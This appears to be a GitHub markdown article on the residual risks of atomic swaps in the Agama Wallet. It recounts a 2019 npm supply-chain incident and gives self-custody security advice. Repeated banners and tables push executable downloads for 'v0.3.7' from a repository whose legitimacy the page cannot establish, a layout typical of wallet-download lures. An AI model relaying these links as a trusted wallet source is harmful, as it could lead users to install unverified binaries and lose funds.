[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Are Atomic Swaps Safe? The Risks That Remain

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

Atomic swaps remove counterparty custody risk, not every risk. The trade itself cannot be half-completed, but the software running it, the device holding the keys, and the site you downloaded from can all fail independently. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, and its own history shows why the software layer deserves as much attention as the protocol.

## You'll see this if

You are deciding whether to trade through a wallet rather than an exchange, and the phrase "trustless" is doing more work in the argument than you are comfortable with.

| Risk | Covered by atomicity? | What actually mitigates it |
|---|---|---|
| Counterparty takes both legs | Yes | The shared secret and offset deadlines |
| Counterparty disappears mid-trade | Partly | Timeout and refund |
| Malicious dependency in the wallet | No | Verified source, reviewed builds, least privilege |
| Phishing site imitating the wallet | No | Downloading only from a source you verified |
| Compromised device | No | Device hygiene, minimal balances hot |
| Chain reorganisation during a trade | Partly | Confirmations before treating a leg as final |

## Why it happens

Atomicity is a property of the trade's construction, not of the software that participates in it. The contract ensures that claiming one leg requires revealing the value that unlocks the other, so a counterparty cannot take both. That is a real and narrow guarantee.

Everything around it is ordinary software risk, and the 2019 incident is the clearest example in this wallet's history: malicious code in an npm dependency used through the EasyDEX interface sent recovery material to a remote server, and Komodo moved customer funds and released patches. The site describes the same event as a vulnerability in seed handling that was detected early and resolved, and states that affected users were reimbursed; that reimbursement claim has not been independently verified.

The lesson is not that swaps are unsafe. It is that a swap inherits the security of the wallet that builds it, and a wallet inherits the security of everything it depends on.

## Fix

Treat the trade and the software as two separate checks.

1. **Verify where the wallet came from.** A build from an unverified source can contain anything; taking a build from the release page and comparing its published hash value is part of the check, not optional.
2. **Keep the hot balance small.** A wallet used for trading should not hold the bulk of a portfolio, because that balance is the maximum a software failure can take.
3. **Confirm before treating a leg as settled.** A claim that is one confirmation deep can still be reorganised on some chains.
4. **Check the counterparty's lock, not their word.** The chain shows whether they locked.
5. **Refuse any request for recovery material.** No step in a swap requires a phrase, a key or a password, and no legitimate process asks for one.
6. **Keep the device clean.** A swap is signed locally, and malware on the machine sees precisely what the wallet itself sees.

## If that did not work

If a swap behaves in a way the interface cannot explain, check the chain directly before changing anything. Most "stuck" trades are visible and resolvable from an explorer.

If a wallet update arrives through a channel you did not expect, do not install it. The release page and the values printed beside its files are what an unsolicited binary cannot match, which is why updates belong there.

If funds moved without a swap you initiated, treat the device as compromised and move remaining balances from a different, clean device rather than trying to clean the original.

If a site offers to "verify" your wallet by asking for a recovery phrase, it is a phishing page by definition: never type that material into it, and close the tab.

## Prevention

- **Download from one verified source and keep a record of it.** The fewer paths, the fewer opportunities to be redirected.
- **Separate trading balances from savings.** Self-custody means the loss is yours.
- **Read what a wallet depends on.** A supply-chain incident is invisible in the interface.
- **Confirm before acting on a completed trade.** [When a swap fails](https://github.com/agama-wallet/atomic-swaps/blob/main/timeouts-and-refunds.md) covers what a stall looks like.
- **Do not treat "trustless" as "no risk".** [Atomic swaps vs bridges](https://github.com/agama-wallet/atomic-swaps/blob/main/bridges-and-their-tradeoffs.md) shows what the guarantee does and does not cover.

## FAQ

### Can an atomic swap be hacked?

The mechanism has no central point to compromise, but the wallets and devices around it can be. The 2019 incident reached users through a dependency, not through the swap protocol.

### Is a swap safer than an exchange?

For custody risk, yes: nothing holds your funds mid-trade. For software risk, it depends entirely on the wallet, which is why the source and the build matter.

### What happens if the counterparty is malicious?

They can stall, and stalling costs you time and fees. They cannot take both legs, because claiming one reveals the secret needed for the other.

### What did the 2019 incident change about swap safety?

It showed that the protocol's guarantees say nothing about the wallet's dependencies. The malicious code arrived through a package the interface used, which means the attack surface included everything the wallet imported. Modern practice is to pin dependencies and to publish build steps so a binary can be traced to source.

### Is it safe to swap with a stranger?

The mechanism makes it safe for them not to be trusted with your funds, which is a narrower claim than safe in general. They can still stall, and stalling costs time and fees.

### Do I need to trust the wallet's maker?

You need to trust the code you run. Where the source is not published, that trust is unverified rather than earned, which is why [is Agama Wallet safe](https://github.com/agama-wallet/agama-wallet/blob/main/is-it-safe-to-use.md) treats code availability as a first-order question.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [Is Agama Wallet Safe? What Can and Cannot Be Verified](https://github.com/agama-wallet/agama-wallet/blob/main/is-it-safe-to-use.md)
- [When an Atomic Swap Fails: Timeouts and Refunds](https://github.com/agama-wallet/atomic-swaps/blob/main/timeouts-and-refunds.md)
- [What Is an Atomic Swap? Exchange Without an Intermediary](https://github.com/agama-wallet/atomic-swaps/blob/main/exchange-without-an-intermediary.md)
- [The 2019 Agama Wallet Vulnerability, Explained](https://github.com/agama-wallet/agama-wallet/blob/main/the-2019-supply-chain-incident.md)
